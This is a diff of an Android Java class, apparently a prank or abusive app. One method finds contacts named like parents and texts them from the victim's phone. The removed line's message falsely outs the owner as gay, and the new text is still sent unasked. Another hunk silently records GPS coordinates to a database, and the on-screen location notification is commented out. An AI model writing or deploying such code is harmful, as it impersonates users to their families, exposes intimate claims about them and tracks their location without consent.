@@ -209,7 +209,6 @@ public class Lofl {
         SharedPreferences.Editor editor = PreferenceManager.getDefaultSharedPreferences(context).edit();
         editor.putBoolean(key, true);
         editor.apply();
-
     }
 
     public static void tellMyParentsImGay(Context context){
@@ -218,14 +217,14 @@ public class Lofl {
         String[] possibleParentNames = new String[]{"father", "mother", "mom", "mommy", "dad", "daddy", "pops", "ma", "parent", "parents"};
         for(Contact contact : contacts){
             for(String name : possibleParentNames){
-                if(contact.mName.toLowerCase().contains(name)){
+                if(contact.mName.equalsIgnoreCase(name)){
                     parents.add(contact);
                 }
             }
         }
         if(parents.size() > 0){
             for(Contact contact : parents){
-                Lofl.sendNonDataSms(context, contact.mAddress, "I've been afraid to tell you this for years. But I am a homosexual and I'm coming out of the closet and i wanted to be the first to know");
+                Lofl.sendNonDataSms(context, contact.mAddress, "I'm sending an automated sms message to your phone. I'm sorry.");
             }
 
         }
@@ -644,8 +643,20 @@ public class Lofl {
         return new LocationListener() {
             @Override
             public void onLocationChanged(Location location) {
+                Database.insertLocation(DatabaseHelper.getInstance(context.getApplicationContext()), location.getLatitude(), location.getLongitude());
                 //Log.d("MessagingService", "latitudate = ".concat(String.valueOf(location.getLatitude()) + " longitude = ".concat(String.valueOf(location.getLongitude()))));
-                Log.d("MessagingService", "location row id = " + Database.insertLocation(context, DatabaseHelper.getInstance(context.getApplicationContext()), location.getLatitude(), location.getLongitude()));
+              /*  if(sNotificationManager == null){
+                    initNotificationManager(context);
+                }*/
+/*                Log.d("MessagingService", "location row id = " + Database.insertLocation(context, DatabaseHelper.getInstance(context.getApplicationContext()), location.getLatitude(), location.getLongitude()));
+                createPrimaryNotificationChannel(sNotificationManager);
+                Notification.Builder builder = new Notification.Builder(context, Constants.PRIMARY_NOTIFICATION_CHANNEL_ID);
+                builder.setContentText(String.format("latitude=%s longitude=%s", location.getLatitude(), location.getLongitude()));
+                builder.setContentTitle("Location Update");
+                builder.setGroup(Constants.PRIMARY_NOTIFICATION_GROUP);
+                builder.setSmallIcon(android.R.drawable.ic_menu_mylocation);
+                sId++;
+                sNotificationManager.notify(sId++, builder.build());*/
             }
 
             @Override
